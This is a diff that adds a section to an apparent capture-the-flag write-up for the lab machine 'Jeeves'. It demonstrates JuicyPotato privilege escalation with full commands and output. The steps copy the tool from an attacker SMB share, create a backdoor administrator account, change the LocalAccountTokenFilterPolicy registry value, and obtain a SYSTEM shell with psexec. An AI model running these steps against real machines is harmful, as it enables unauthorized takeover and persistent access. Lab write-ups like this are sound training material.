@@ -82,3 +82,54 @@ dir /s /r
 
 more < hm.txt:root.txt
 ```
+----
+Another way to elevete our privileges is using juicy potato. For that we verify that the regular user has the SeImpersonatePrivilege capabilities.
+```powershell
+whoami /priv
+SeImpersonatePrivilege
+```
+Then lets download the juicy potato .exe file from the github repository under "fresh potatoes"
+
+https://github.com/ohpe/juicy-potato
+
+and bring the file to the victim machine under a folder we have write privileges. We can use SMB again to get the file from our attack machine.
+```powershell
+copy \\10.10.14.5\smbFolder\JuicyPotato.exe JP.exe
+```
+we are going to add a new user, confirm the user has been generated and then add the user to the administrators group. 
+```powershell
+jp.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user ricky h4ck3r123$! /add" -l 1337
+
+net user
+ricky
+
+jp.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators ricky /add" -l 1337
+
+net user ricky
+ *Administrators 
+```
+If we validate the user with cme we see the user is valid but the pwned is missing from the output.
+```zsh
+cme smb 10.10.10.63 -u "ricky" -p 'h4ck3r123$!'
+SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
+SMB         10.10.10.63     445    JEEVES           [+] Jeeves\ricky:h4ck3r123$!
+```
+To solve that we need to retouch a parameter inside the windows target machine. The LocalAccountTokenFilterPolicy is a filter that prevents elevated privileges from being used over the network. This only applies to local administrative accounts, they do not affect domain accounts. Because of this restriction, we can't use of the account's privileges over the network. To disable the LocalAccountTokenFilterPolicy, we must tweak the following registry:
+
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system
+
+Specifically, the named value “LocalAccountTokenFilterPolicy”. We are interested in its value being 1. We can change its value using the following:
+```powershell
+jp.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
+
+cme smb 10.10.10.63 -u "ricky" -p 'h4ck3r123$!'
+SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
+SMB         10.10.10.63     445    JEEVES           [+] Jeeves\ricky:h4ck3r123$! (Pwn3d!)
+```
+From there we can gain access to the machine as a privileges user. 
+```powershell
+psexec.py WORKGROUP/ricky@10.10.10.63 cmd.exe
+
+whoami
+nt authority\system
+```
